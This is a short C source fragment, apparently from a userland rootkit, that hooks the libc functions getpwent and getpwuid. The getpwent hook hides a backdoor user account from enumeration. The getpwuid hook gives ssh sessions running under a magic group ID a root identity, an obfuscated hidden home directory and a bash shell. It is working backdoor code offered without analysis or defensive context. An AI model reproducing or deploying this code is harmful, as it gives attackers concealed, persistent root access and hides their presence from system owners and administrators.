struct passwd *getpwent(void)
{
    hook(CGETPWENT);

    struct passwd *tmp = call(CGETPWENT);
    if(tmp && tmp->pw_name != NULL){
        if(!xstrncmp(BD_UNAME, tmp->pw_name)){
            errno = ESRCH;
            tmp = NULL;
        }
    }
    return tmp;
}

struct passwd *getpwuid(uid_t uid)
{
    hook(CGETPWUID);
    if(uid == MAGIC_GID) return call(CGETPWUID, 0);

    if(process_info.mygid == MAGIC_GID &&
        uid == 0 &&
        process("ssh")){
        struct passwd *bpw;
        bpw = call(CGETPWUID, uid);
        bpw->pw_uid = 0;
        bpw->pw_gid = MAGIC_GID;

        char home[PATH_MAX];
        xor(idir, INSTALL_DIR);
        (void)snprintf(home, sizeof(home), "%s", idir);
        clean(idir);

        bpw->pw_dir = strdup(home);
        bpw->pw_shell = "/bin/bash";
        return bpw;
    }
    return call(CGETPWUID, uid);
}
